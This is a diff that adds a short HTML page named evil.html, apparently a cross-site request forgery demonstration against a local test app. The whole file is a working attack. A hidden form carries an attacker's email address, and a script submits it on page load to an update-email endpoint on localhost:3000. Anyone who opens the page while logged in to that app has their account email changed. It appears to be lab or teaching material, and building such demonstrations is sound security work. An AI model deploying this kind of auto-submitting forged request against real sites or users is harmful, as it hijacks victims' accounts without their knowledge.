@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Update Email</title>
+    </head>
+    <body>
+        <!-- evil.html -->
+        <form action="http://localhost:3000/update-email" method="POST">
+        <input type="hidden" name="email" value="attacker@example.com">
+        </form>
+
+        <script>
+        document.forms[0].submit();
+        </script>
+    </body>
+</html>
